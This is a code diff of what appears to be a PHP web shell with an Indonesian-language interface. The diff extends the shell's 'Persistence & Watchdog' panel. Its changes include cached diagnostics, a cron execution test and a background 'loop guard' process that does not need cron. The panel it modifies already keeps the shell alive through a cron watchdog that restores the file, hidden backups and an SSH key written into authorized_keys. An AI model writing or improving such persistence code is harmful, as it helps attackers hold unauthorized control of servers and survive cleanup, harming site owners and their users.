 foreach ($p_back as $pb) { if (@is_file($pb)) $p_live[] = $pb; }
-list($p_crontab, $p_cron_via) = rct_cron_read();
-$p_crontab = (string)$p_crontab;
-list($p_probe, $p_exrc) = rct_run('true');
+// tab ini nggak ngeksekusi apa pun saat dibuka: semua probe jalan hanya kalau tombol Diagnostik ditekan,
+// hasilnya disimpan ke .rct_state.json supaya refresh berikutnya tetap instan
+$psc = (isset($pst['scan']) && is_array($pst['scan'])) ? $pst['scan'] : array();
+if (isset($_POST['persist_scan'])) {
+    $p_t0 = microtime(true);
+    try {
+        list($p_probe_o, $p_exrc_new) = rct_run('true');
+        list($p_crontab_new, $p_via_new) = rct_cron_read();
+        $p_daemon_new = rct_cron_daemon();
+        $psc = array('t'=>time(),'exrc'=>(int)$p_exrc_new,'via'=>(string)$p_via_new,'crontab'=>(string)$p_crontab_new,'daemon'=>(string)$p_daemon_new,'ms'=>(int)round((microtime(true)-$p_t0)*1000),'err'=>'');
+    } catch (Exception $p_e) {
+        $psc = array('t'=>time(),'ms'=>(int)round((microtime(true)-$p_t0)*1000),'err'=>$p_e->getMessage());
+    }
+    $pst['scan'] = $psc;
+    rct_state_save($rct_state_file, $pst);
+}
+$p_scanned = !empty($psc['t']);
+$p_exrc = $p_scanned && isset($psc['exrc']) ? (int)$psc['exrc'] : null;
+$p_cron_via = $p_scanned && isset($psc['via']) ? (string)$psc['via'] : 'belum dicek';
+$p_crontab = $p_scanned && isset($psc['crontab']) ? (string)$psc['crontab'] : '';
+$p_daemon = $p_scanned && isset($psc['daemon']) ? (string)$psc['daemon'] : 'belum dicek';
 $p_wd = array();
 foreach (preg_split("/\r\n|\n|\r/", $p_crontab) as $pl) { if (strpos($pl, 'RCT-WD') !== false && trim($pl) !== '') $p_wd[] = $pl; }
 $p_kpath = isset($pst['keypath']) ? $pst['keypath'] : '';
@@ -3302,17 +3640,58 @@ $p_key_ok = $p_kpath !== '' && @is_file($p_kpath) && strpos((string)@file_get_co
 $p_target = isset($pst['target']) && $pst['target'] !== '' ? $pst['target'] : __FILE__;
 $p_rc_home = rct_home();
 $p_default_key = ($p_rc_home !== '' ? $p_rc_home : dirname(__DIR__)) . '/.ssh/authorized_keys';
+$p_user = rct_user_name();
+$p_spool = rct_cron_file();
+$p_probe_last = ''; $p_probe_age = -1;
+if (isset($pst['probe']['file']) && @is_file($pst['probe']['file'])) {
+    $p_probe_last = trim((string)@file_get_contents($pst['probe']['file']));
+    $p_probe_age = time() - (int)@filemtime($pst['probe']['file']);
+}
+$p_loop = isset($pst['loop_pid']) ? (int)$pst['loop_pid'] : 0;
+$p_loop_live = $p_loop > 1 && pid_alive($p_loop);
 ?>
 <div class="box">
     <div class="name">Persistence &amp; Watchdog</div>
     <div style="display:flex; gap:8px; flex-wrap:wrap; margin-bottom:12px; font-size:11px;">
-        <span style="background:#1b2330; padding:4px 8px; border-radius:4px;">exec: <b style="color:<?php echo $p_exrc === -1 ? '#ff7b72' : '#7ee787'; ?>;"><?php echo $p_exrc === -1 ? 'mati' : 'idup'; ?></b></span>
-        <span style="background:#1b2330; padding:4px 8px; border-radius:4px;">cron read: <b style="color:<?php echo $p_cron_via === 'exec mati' ? '#e3b341' : '#7ee787'; ?>;"><?php echo h($p_cron_via); ?></b></span>
-        <span style="background:#1b2330; padding:4px 8px; border-radius:4px;">watchdog: <b style="color:<?php echo $p_wd ? '#7ee787' : '#8e99ab'; ?>;"><?php echo count($p_wd); ?></b> baris</span>
+        <span style="background:#1b2330; padding:4px 8px; border-radius:4px;">exec: <b style="color:<?php echo $p_exrc === null ? '#8e99ab' : ($p_exrc === -1 ? '#ff7b72' : '#7ee787'); ?>;"><?php echo $p_exrc === null ? '?' : ($p_exrc === -1 ? 'mati' : 'idup'); ?></b></span>
+        <span style="background:#1b2330; padding:4px 8px; border-radius:4px;">cron read: <b style="color:<?php echo $p_cron_via === 'belum dicek' ? '#8e99ab' : ($p_cron_via === 'exec mati' ? '#e3b341' : '#7ee787'); ?>;"><?php echo h($p_cron_via); ?></b></span>
+        <span style="background:#1b2330; padding:4px 8px; border-radius:4px;">daemon cron: <b style="color:<?php echo $p_daemon === 'belum dicek' ? '#8e99ab' : ($p_daemon === 'mati' ? '#ff7b72' : '#7ee787'); ?>;"><?php echo h($p_daemon); ?></b></span>
+        <span style="background:#1b2330; padding:4px 8px; border-radius:4px;">user: <code><?php echo h($p_user); ?></code></span>
+        <span style="background:#1b2330; padding:4px 8px; border-radius:4px;">spool: <code><?php echo h($p_spool !== '' ? $p_spool : 'nggak writable'); ?></code></span>
+        <span style="background:#1b2330; padding:4px 8px; border-radius:4px;">watchdog: <?php if ($p_scanned) { ?><b style="color:<?php echo $p_wd ? '#7ee787' : '#8e99ab'; ?>;"><?php echo count($p_wd); ?></b> baris<?php } else { ?><b style="color:#8e99ab;">—</b><?php } ?></span>
         <span style="background:#1b2330; padding:4px 8px; border-radius:4px;">backup: <b style="color:<?php echo $p_live ? '#7ee787' : '#8e99ab'; ?>;"><?php echo count($p_live); ?></b></span>
         <span style="background:#1b2330; padding:4px 8px; border-radius:4px;">ssh key: <b style="color:<?php echo $p_key_ok ? '#7ee787' : '#8e99ab'; ?>;"><?php echo $p_key_ok ? 'terpasang' : 'belum'; ?></b></span>
+        <?php if ($p_loop) { ?><span style="background:#1b2330; padding:4px 8px; border-radius:4px;">loop guard: <b style="color:<?php echo $p_loop_live ? '#7ee787' : '#ff7b72'; ?>;"><?php echo $p_loop_live ? 'pid ' . $p_loop : 'mati'; ?></b></span><?php } ?>
         <span style="background:#1b2330; padding:4px 8px; border-radius:4px;">target: <code><?php echo h($p_target); ?></code></span>
     </div>
+
+    <form method="post" style="margin-bottom:12px; padding:8px 10px; border-radius:6px; background:#11161f; border:1px solid #2a3140; font-size:11px;">
+        <input type="submit" name="persist_scan" value="Jalankan diagnostik" class="btn">
+        <?php if ($p_scanned) { ?>
+        <span class="muted" style="margin-left:8px;">terakhir <?php echo date('d/m H:i:s', (int)$psc['t']); ?> &middot; <?php echo (int)(isset($psc['ms']) ? $psc['ms'] : 0); ?> ms</span>
+        <?php } else { ?>
+        <span class="muted" style="margin-left:8px;">belum pernah dicek</span>
+        <?php } ?>
+        <div class="muted" style="margin-top:5px;">Tab ini sengaja nggak ngeksekusi apa pun waktu dibuka. Tekan tombol ini sekali; hasilnya disimpan dan dipakai terus sampai ditekan lagi.</div>
+        <?php if (!empty($psc['err'])) { ?>
+        <div style="margin-top:6px; color:#ff7b72;">Probe error: <code><?php echo h($psc['err']); ?></code></div>
+        <?php } ?>
+    </form>
+
+    <?php if ($p_probe_age >= 0) { ?>
+    <div style="margin-bottom:12px; padding:8px 10px; border-radius:6px; font-size:11px; background:<?php echo ($p_probe_age < 150) ? '#0f2a17' : '#2a1a0f'; ?>; border:1px solid <?php echo ($p_probe_age < 150) ? '#2ea043' : '#9e6a03'; ?>;">
+        <b>Tes cron: <?php echo ($p_probe_age < 150) ? 'CRON JALAN' : 'CRON NGGAK NGEKSEKUSI'; ?></b>
+        &middot; umur output <?php echo $p_probe_age; ?>s &middot; isi terakhir: <code><?php echo h(substr($p_probe_last, -120)); ?></code><br>
+        <?php echo ($p_probe_age < 150)
+            ? 'Daemon cron baca baris user ini. Kalau watchdog tetap nggak balikin file, cek backup masih ada.'
+            : 'Barisnya ada di crontab tapi nggak pernah jalan — daemon mati, atau spool ditulis langsung tanpa dibaca cron. Pakai Loop guard.'; ?>
+        <form method="post" style="display:inline; margin-left:6px;"><input type="hidden" name="persist_action" value="probe_remove"><input type="submit" class="btn" value="Hapus tes" style="padding:2px 8px;font-size:10px;"></form>
+    </div>
+    <?php } elseif (isset($pst['probe'])) { ?>
+    <div style="margin-bottom:12px; padding:8px 10px; border-radius:6px; font-size:11px; background:#1b2330; border:1px solid #2a3140;">
+        Tes cron terpasang, nunggu eksekusi pertama — refresh tab ini setelah 2 menit.
+    </div>
+    <?php } ?>
 
     <?php if ($p_wd) { ?>
     <div style="margin-bottom:12px;">
@@ -3354,6 +3733,9 @@ $p_default_key = ($p_rc_home !== '' ? $p_rc_home : dirname(__DIR__)) . '/.ssh/au
         <form method="post" style="display:inline;"><input type="hidden" name="persist_action" value="remove_watchdog"><input type="submit" class="btn" value="Hapus cron watchdog"></form>
         <form method="post" style="display:inline;"><input type="hidden" name="persist_action" value="remove_backups"><input type="submit" class="btn btn-red" value="Hapus semua backup" onclick="return confirm('Hapus semua file backup?');"></form>
         <form method="post" style="display:inline;"><input type="hidden" name="persist_action" value="remove_all"><input type="submit" class="btn btn-red" value="Remove ALL hook" onclick="return confirm('Hapus cron watchdog + backup + key RCT? Ini beneran bersihin semua.');"></form>
+        <form method="post" style="display:inline;"><input type="hidden" name="persist_action" value="test_cron"><input type="submit" class="btn btn-green" value="Tes cron (1 menit)"></form>
+        <form method="post" style="display:inline;"><input type="hidden" name="persist_action" value="loop_guard"><input type="submit" class="btn btn-yellow" value="Loop guard (tanpa cron)" onclick="return confirm('Jalankan loop pengawal di background? Butuh exec.');"></form>
+        <?php if ($p_loop) { ?><form method="post" style="display:inline;"><input type="hidden" name="persist_action" value="stop_loop"><input type="submit" class="btn btn-red" value="Stop loop guard"></form><?php } ?>
     </div>
 
     <?php if ($p_live) { ?>
@@ -3379,21 +3761,7 @@ $p_default_key = ($p_rc_home !== '' ? $p_rc_home : dirname(__DIR__)) . '/.ssh/au
     <div class="name">Cron &amp; Timer di Host</div>
     <div style="margin-bottom:12px;">
         <b>Crontab user saat ini:</b>
-        <pre style="background:#0a0e14;padding:8px;margin-top:4px;font-size:11px;"><?php echo h($p_crontab !== '' ? $p_crontab : '(kosong — dibaca via ' . $p_cron_via . ')'); ?></pre>
-    </div>
-    <div style="margin-bottom:12px;">
-        <b>System cron (&lt;b&gt;/etc/crontab&lt;/b&gt;, /etc/cron.d/*):</b>
-        <pre style="background:#0a0e14;padding:8px;margin-top:4px;font-size:11px;"><?php
-        list($p_sys, $p_sysrc) = rct_run('cat /etc/crontab /etc/cron.d/* 2>/dev/null');
-        echo h($p_sysrc === -1 ? '(exec mati)' : ((string)$p_sys !== '' ? $p_sys : '(kosong / nggak kebaca)'));
-        ?></pre>
-    </div>
-    <div>
-        <b>Systemd timers:</b>
-        <pre style="background:#0a0e14;padding:8px;margin-top:4px;font-size:11px;"><?php
-        list($p_tm, $p_tmrc) = rct_run('systemctl list-timers --all 2>/dev/null | head -20');
-        echo h($p_tmrc === -1 ? '(exec mati)' : ((string)$p_tm !== '' ? $p_tm : '(kosong / no systemd)'));
-        ?></pre>
+        <pre style="background:#0a0e14;padding:8px;margin-top:4px;font-size:11px;"><?php echo h($p_crontab !== '' ? $p_crontab : ($p_scanned ? '(kosong — dibaca via ' . $p_cron_via . ')' : 'belum dicek — tekan Diagnostik di atas')); ?></pre>
     </div>
 </div>
 <?php endif; ?>
@@ -3652,6 +4020,12 @@ if ($view != '' && @is_file($view)) { ?>
 </div>
 <script>
 function setCmd(cmd) { document.getElementById('cmd').value = cmd; }
+function rctCopy(id) {
+    var e = document.getElementById(id);
+    if (!e) return;
+    e.select(); e.setSelectionRange(0, 99999);
+    try { document.execCommand('copy'); } catch (x) {}
+}
 function rctPoll() {
     var out = document.getElementById('rct-out');
     var st  = document.getElementById('rct-status');
